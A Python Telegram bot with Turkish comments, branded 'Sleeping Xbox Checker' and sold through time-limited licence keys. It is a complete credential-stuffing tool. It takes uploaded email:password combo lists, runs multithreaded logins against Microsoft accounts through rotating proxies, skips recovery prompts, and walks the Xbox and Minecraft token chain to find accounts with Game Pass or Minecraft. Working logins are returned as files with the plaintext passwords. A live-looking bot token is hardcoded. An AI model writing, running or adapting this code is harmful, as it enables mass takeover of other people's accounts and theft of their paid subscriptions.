import os
import re
import time
import uuid
import json
import requests
import telebot
import urllib3
import warnings
from telebot import types
from threading import Thread, Lock
from urllib.parse import urlparse, parse_qs

# Uyarıları gizle
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# --- AYARLAR VE TANIMLAMALAR ---
BOT_TOKEN = "7697030798:AAHiTipLyZu7HCjJnCFu5CEgAHYaqP64ha4"
ADMIN_ID = 8664147577

bot = telebot.TeleBot(BOT_TOKEN)

# Veritabanı dosyaları
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
PROXIES_FILE = "proxies.txt"

# Hafıza önbelleği
user_sessions = {}  
active_tasks = {}   
user_hits = {} # Hitleri biriktirmek için

# İstek ayarları (İstek üzerine timeout 5 saniyeye düşürüldü)
MAX_RETRIES = 2
REQUEST_TIMEOUT = 10
MAX_THREADS = 30  # Aynı anda çalışacak maksimum thread sayısı

# Çoklu iş parçacığı güvenliği için kilitler (Locks)
stats_lock = Lock()
msg_lock = Lock()
hit_lock = Lock()
proxy_lock = Lock()

# Global proxy indeksi takipçisi
global_proxy_index = 0

# Dosyaları ilklendirme
for file in [KEYS_FILE, USERS_FILE]:
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
if not os.path.exists(PROXIES_FILE):
    with open(PROXIES_FILE, 'w') as f: f.write("")

def load_json(filename):
    with open(filename, 'r') as f: return json.load(f)

def save_json(filename, data):
    with open(filename, 'w') as f: json.dump(data, f, indent=4)

def load_proxies():
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

# --- XBOX CHECKER ENGINE ---
SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

def get_sftag(session, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
            text = response.text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sftag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match: return match.group(1), sftag
        except: pass
        time.sleep(0.3)
    return None, None

def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            
            if '#' in login_request.url and login_request.url != SFTAG_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None": return token, "success"
            elif 'cancel?mkt=' in login_request.text:
                try:
                    data = {
                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret = session.post(action_url, data=data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None": return token, "success"
                except: pass
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"
        except: pass
        time.sleep(0.3)
    return None, "error"

def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
            elif response.status_code == 429: time.sleep(1); continue
        except: pass
        time.sleep(0.3)
    return None, None

def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json().get('Token')
            elif response.status_code == 429: time.sleep(1); continue
        except: pass
        time.sleep(0.3)
    return None

def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json().get('access_token')
            elif response.status_code == 429: time.sleep(1); continue
        except: pass
        time.sleep(0.3)
    return None

def check_minecraft_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                text = response.text
                if 'product_game_pass_ultimate' in text: return 'Xbox Game Pass Ultimate'
                elif 'product_game_pass_pc' in text: return 'Xbox Game Pass'
                elif '"product_minecraft"' in text: return 'Minecraft'
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text: others.append("Bedrock")
                    if 'product_legends' in text: others.append("Legends")
                    if 'product_dungeons' in text: others.append('Dungeons')
                    if others: return 'Other: ' + ', '.join(others)
                    return None
            elif response.status_code == 429: time.sleep(1); continue
        except: pass
        time.sleep(0.3)
    return None

def get_minecraft_profile(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json()
            elif response.status_code == 429: time.sleep(1); continue
            elif response.status_code == 404: return None
        except: pass
        time.sleep(0.3)
    return None

# --- TELEGRAM BOT KLAVYELERİ (UI) ---
def main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("🚀 Tarama Başlat"), types.KeyboardButton("👤 Profilim"))
    if str(user_id) == str(ADMIN_ID):
        markup.add(types.KeyboardButton("👑 Admin Paneli"))
    return markup

def admin_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔑 Key Oluştur", callback_data="adm_gen_key"),
        types.InlineKeyboardButton("📜 Keyleri Listele", callback_data="adm_list_keys"),
        types.InlineKeyboardButton("🌐 Proxy Yönet", callback_data="adm_proxies")
    )
    return markup

def check_user_access(user_id):
    users = load_json(USERS_FILE)
    if str(user_id) == str(ADMIN_ID): return True
    if str(user_id) in users and users[str(user_id)]["expiry"] > time.time(): return True
    return False

# --- PROFILE VE ADMIN PANELİ MESAJ YÖNETİCİLERİ ---
@bot.message_handler(func=lambda msg: msg.text == "👤 Profilim")
def profile_handler(message):
    user_id = message.from_user.id
    users = load_json(USERS_FILE)
    
    if str(user_id) == str(ADMIN_ID):
        status = "👑 Kurucu (Sınırsız)"
        expiry_date = "Ömür Boyu"
    elif str(user_id) in users:
        rem_time = users[str(user_id)]["expiry"] - time.time()
        if rem_time > 0:
            status = "💎 VIP"
            expiry_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(users[str(user_id)]["expiry"]))
        else:
            status = "❌ Süresi Dolmuş"
            expiry_date = "Yok"
    else:
        status = "❌ Lisanssız"
        expiry_date = "Yok"
        
    profile_text = (
        f"👤 **Kullanıcı Bilgilerin**\n\n"
        f"🆔 **ID:** `{user_id}`\n"
        f"🎭 **Durum:** `{status}`\n"
        f"⏳ **Bitiş Tarihi:** `{expiry_date}`"
    )
    bot.send_message(message.chat.id, profile_text, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "👑 Admin Paneli")
def admin_panel_trigger(message):
    if str(message.from_user.id) == str(ADMIN_ID):
        bot.send_message(message.chat.id, "🎛️ **Admin Kontrol Merkezi:**", reply_markup=admin_keyboard(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
def admin_callback_handler(call):
    if str(call.from_user.id) != str(ADMIN_ID): return
    
    if call.data == "adm_gen_key":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("1 Günlük", callback_data="gen_86400"),
            types.InlineKeyboardButton("7 Günlük", callback_data="gen_604800"),
            types.InlineKeyboardButton("30 Günlük", callback_data="gen_2592000")
        )
        bot.edit_message_text("🔑 Ne kadarlık bir key üretmek istiyorsun?", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif call.data == "adm_list_keys":
        keys = load_json(KEYS_FILE)
        text = "📜 **Sistemdeki Aktif (Kullanılmayan) Keyler:**\n\n"
        count = 0
        for k, v in keys.items():
            if not v["used"]:
                dur_days = v["duration"] // 86400
                text += f"`{k}` | ({dur_days} Gün)\n"
                count += 1
            if count >= 15: break
        if count == 0: text += "Kullanılmayan aktif anahtar yok."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        
    elif call.data == "adm_proxies":
        proxies = load_proxies()
        bot.answer_callback_query(call.id, f"🌐 Yüklü Proxy Sayısı: {len(proxies)}", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
def process_key_generation(call):
    if str(call.from_user.id) != str(ADMIN_ID): return
    duration = int(call.data.split("_")[1])
    generated_key = f"SLEEPING-" + str(uuid.uuid4()).upper()[:10]
    
    keys = load_json(KEYS_FILE)
    keys[generated_key] = {"duration": duration, "used": False, "used_by": None}
    save_json(KEYS_FILE, keys)
    
    bot.edit_message_text(f"✅ **Key Başarıyla Üretildi!**\n\n`{generated_key}`\n\nKullanıcı bota girip bunu direkt yapıştırabilir.", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

# --- DURDURMA KOMUTU ---
@bot.message_handler(commands=['stop'])
def stop_checking(message):
    user_id = message.from_user.id
    if user_id in active_tasks and active_tasks[user_id]:
        active_tasks[user_id] = False # Döngüyü kırmak için bayrağı indir
        bot.send_message(message.chat.id, "🛑 **Tarama durduruluyor!** Mevcut havuzdaki işlemler tamamlandıktan hemen sonra bulunan hitler gönderilecek...", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "⚠️ Şu anda çalışan bir tarama yok.")

@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    welcome_text = "💤 **Sleeping Xbox Checker Botuna Hoş Geldiniz!** 💤\n\n"
    if check_user_access(user_id):
        welcome_text += "Erişiminiz aktif! Menüyü kullanarak tarama yapabilirsiniz.\nTaramayı durdurmak için `/stop` yazabilirsiniz."
        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
    else:
        welcome_text += "❌ Sistemi kullanmak için geçerli bir lisans anahtarınız (Key) olmalıdır.\n\nLütfen bir Key girin:"
        user_sessions[user_id] = "waiting_for_key"
        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: user_sessions.get(msg.from_user.id) == "waiting_for_key")
def process_key_activation(message):
    user_id = message.from_user.id
    input_key = message.text.strip()
    keys = load_json(KEYS_FILE)
    users = load_json(USERS_FILE)

    if input_key in keys and not keys[input_key]["used"]:
        keys[input_key]["used"] = True
        keys[input_key]["used_by"] = user_id
        users[str(user_id)] = {"expiry": time.time() + keys[input_key]["duration"], "username": message.from_user.username}
        save_json(KEYS_FILE, keys)
        save_json(USERS_FILE, users)
        user_sessions[user_id] = None
        bot.send_message(message.chat.id, "✅ **Key Başarıyla Aktif Edildi!**", parse_mode="Markdown", reply_markup=main_keyboard(user_id))
    else:
        bot.send_message(message.chat.id, "❌ Geçersiz veya kullanılmış Key. Tekrar deneyin:")

@bot.message_handler(func=lambda msg: msg.text == "🚀 Tarama Başlat")
def start_checker_flow(message):
    if not check_user_access(message.from_user.id): return
    if active_tasks.get(message.from_user.id, False):
        bot.send_message(message.chat.id, "⚠️ Zaten devam eden bir taramanız var. Durdurmak için `/stop` kullanın.", parse_mode="Markdown")
        return
        
    markup = types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton("🌐 Proxyli", callback_data="mode_proxy"),
        types.InlineKeyboardButton("📱 Proxyless", callback_data="mode_proxyless")
    )
    bot.send_message(message.chat.id, "🤖 Mod seçin:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("mode_"))
def select_mode_and_request_combos(call):
    user_id = call.from_user.id
    mode = "proxy" if call.data == "mode_proxy" else "proxyless"
    if mode == "proxy" and not load_proxies():
        bot.answer_callback_query(call.id, "Proxy yok! Adminin yüklemesi lazım.", show_alert=True)
        return
    user_sessions[user_id] = {"mode": mode, "step": "waiting_combos"}
    bot.edit_message_text(f"📂 Mod: `{mode.upper()}`\n\nComboları **.txt dosyası** olarak gönder veya buraya yapıştır:", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.message_handler(content_types=['document', 'text'])
def handle_combos(message):
    user_id = message.from_user.id
    session = user_sessions.get(user_id)
    
    if isinstance(session, dict) and session.get("step") == "waiting_combos":
        mode = session["mode"]
        combos = []
        
        try:
            if message.document:
                bot.send_message(message.chat.id, "📥 Dosya emiliyor...")
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                raw_text = downloaded_file.decode('utf-8', errors='ignore')
                combos = [line.strip() for line in raw_text.splitlines() if line.strip() and ":" in line]
            elif message.text:
                combos = [line.strip() for line in message.text.splitlines() if line.strip() and ":" in line]
                
            if not combos:
                bot.send_message(message.chat.id, "❌ Geçerli `email:şifre` verisi bulunamadı.")
                return

            user_sessions[user_id] = None
            bot.send_message(message.chat.id, f"🔥 `{len(combos)}` hesap tespit edildi. {MAX_THREADS} Thread ile vurucu tim harekete geçiyor...\n\n⛔ Taramayı bitirmek ve hitleri almak için `/stop` yazabilirsin.")
            
            user_hits[user_id] = []
            active_tasks[user_id] = True
            
            # Ana dağıtıcı motoru arka planda başlat
            t = Thread(target=core_checker_manager, args=(user_id, combos, mode, message.chat.id))
            t.start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Hata oluştu: {str(e)}")

# --- ÇOKLU THREAD DESTEKLİ ARKA PLAN ÇALIŞMA MOTORU ---
def single_combo_worker(user_id, combo, mode, proxies_list, stats, total, chat_id, status_msg):
    """Her bir tekil hesabın check işlemini yapan Thread işçisi"""
    global global_proxy_index
    
    # Kullanıcı taramayı durdurduysa işlem yapma
    if not active_tasks.get(user_id, False):
        return
        
    parts = combo.split(':')
    email = parts[0]
    password = ':'.join(parts[1:])
    
    session = requests.Session()
    session.verify = False
    
    # Çoklu iş parçacığı güvenli proxy seçimi
    if mode == "proxy" and proxies_list:
        with proxy_lock:
            p = proxies_list[global_proxy_index % len(proxies_list)]
            global_proxy_index += 1
        session.proxies = {"http": f"http://{p}", "https://{p}": f"http://{p}"}
        
    url_post, sftag = get_sftag(session)
    
    # Stats güncelleme değişkenleri
    is_bad = False
    is_2fa = False
    is_error = False
    is_hit = False
    acc_type = None
    
    if not url_post or not sftag:
        is_error = True
    else:
        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
        if auth_status == "2fa":
            is_2fa = True
        elif auth_status == "bad":
            is_bad = True
        elif auth_status == "success" and ms_token:
            xbox_token, uhs = get_xbox_token(session, ms_token)
            if xbox_token and uhs:
                xsts_token = get_xsts_token(session, xbox_token)
                if xsts_token:
                    mc_token = get_minecraft_token(session, uhs, xsts_token)
                    if mc_token:
                        acc_type = check_minecraft_entitlements(session, mc_token)
                        if acc_type:
                            is_hit = True
                            profile = get_minecraft_profile(session, mc_token)
                            name, uuid_str, capes = "Not Set", "N/A", "N/A"
                            if profile:
                                name = profile.get('name', 'N/A')
                                uuid_str = profile.get('id', 'N/A')
                                capes_list = [cape["alias"] for cape in profile.get("capes", [])]
                                capes = ", ".join(capes_list) if capes_list else "None"
                            
                            hit_text = (
                                f"Email: {email}\n"
                                f"Password: {password}\n"
                                f"Account Type: {acc_type}\n"
                                f"Name: {name}\n"
                                f"UUID: {uuid_str}\n"
                                f"Capes: {capes}\n"
                                f"=========================="
                            )
                            with hit_lock:
                                if user_id in user_hits:
                                    user_hits[user_id].append(hit_text)
                        else:
                            is_bad = True
                    else:
                        is_error = True
                else:
                    is_error = True
            else:
                is_error = True
        else:
            is_bad = True

    # İstatistikleri thread güvenli (Safe Lock) bir şekilde arttır
    with stats_lock:
        stats["checked"] += 1
        if is_error: stats["errors"] += 1
        elif is_2fa: stats["twofa"] += 1
        elif is_bad: stats["bad"] += 1
        elif is_hit and acc_type:
            if 'Ultimate' in acc_type: stats["xgpu"] += 1
            elif 'Game Pass' in acc_type: stats["xgp"] += 1
            elif 'Minecraft' in acc_type: stats["mc"] += 1
            else: stats["other"] += 1
            
        current_checked = stats["checked"]

    # Canlı Telegram mesaj güncellemesi (Her 5 hesapta bir tetiklenir)
    if current_checked % 5 == 0 or current_checked == total:
        with msg_lock:
            progress_text = (
                f"💤 **Sleeping Xbox Checker Canlı Analiz** 💤\n\n"
                f"🚀 **Hız:** `{MAX_THREADS} Threads` | **Timeout:** `{REQUEST_TIMEOUT}s`\n"
                f"🔄 **Taranan:** `{stats['checked']} / {total}`\n\n"
                f"👑 **GamePass Ultimate:** `{stats['xgpu']}`\n"
                f"🎮 **GamePass PC:** `{stats['xgp']}`\n"
                f"⛏️ **Minecraft:** `{stats['mc']}`\n"
                f"📦 **Diğer Hit:** `{stats['other']}`\n\n"
                f"🔴 **Bad:** `{stats['bad']}` | 🟡 **2FA:** `{stats['twofa']}` | ❌ **Error:** `{stats['errors']}`"
            )
            try:
                bot.edit_message_text(progress_text, chat_id, status_msg.message_id, parse_mode="Markdown")
            except:
                pass

def core_checker_manager(user_id, combos, mode, chat_id):
    """Gelen comboları 30'lu gruplar (Threads) halinde yöneten ana dağıtıcı"""
    proxies_list = load_proxies()
    status_msg = bot.send_message(chat_id, "📊 **Çoklu İş Parçacığı Sistemi Başlatılıyor...**", parse_mode="Markdown")
    
    stats = {"xgpu": 0, "xgp": 0, "mc": 0, "other": 0, "bad": 0, "twofa": 0, "errors": 0, "checked": 0}
    total = len(combos)
    
    threads_pool = []
    
    for combo in combos:
        # Stop komutu verildiyse döngüyü tamamen kır
        if not active_tasks.get(user_id, False):
            break
            
        # Havuzdaki threadleri kontrol et ve MAX_THREADS (30) sınırını koru
        while len(threads_pool) >= MAX_THREADS:
            # Canlı olan threadleri filtrele
            threads_pool = [t for t in threads_pool if t.is_alive()]
            time.sleep(0.05) # CPU'yu yormamak için kısa bekleme
            
        if not active_tasks.get(user_id, False):
            break
            
        # Yeni işçiyi yarat ve başlat
        t = Thread(target=single_combo_worker, args=(user_id, combo, mode, proxies_list, stats, total, chat_id, status_msg))
        threads_pool.append(t)
        t.start()
        
    # Kalan son aktif alt threadlerin tamamen bitmesini bekle
    for t in threads_pool:
        t.join()
        
    # --- DÖNGÜ VE THREADLER BİTİNCE HİTLERİ DOSYA OLARAK GÖNDER ---
    bot.send_message(chat_id, f"🏁 **Av Bitti!** (Toplam Taranan: `{stats['checked']}`)", reply_markup=main_keyboard(user_id))
    
    with hit_lock:
        has_hits = user_id in user_hits and len(user_hits[user_id]) > 0
        hits_count = len(user_hits[user_id]) if has_hits else 0
        
    if has_hits:
        filename = f"Hits_{user_id}_{int(time.time())}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            with hit_lock:
                f.write("\n\n".join(user_hits[user_id]))
        
        with open(filename, "rb") as f:
            bot.send_document(chat_id, f, caption=f"🟢 **Toplam Bulunan Hit:** `{hits_count}`")
            
        try: os.remove(filename)
        except: pass
    else:
        bot.send_message(chat_id, "😢 Maalesef hiçbir geçerli hit bulunamadı.")
        
    # Oturum temizliği
    if user_id in active_tasks: del active_tasks[user_id]
    if user_id in user_hits: del user_hits[user_id]

if __name__ == '__main__':
    print("[+] Sleeping Xbox Checker aktif. Kurallar yok, sınırlar yok. Emir bekleniyor...")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
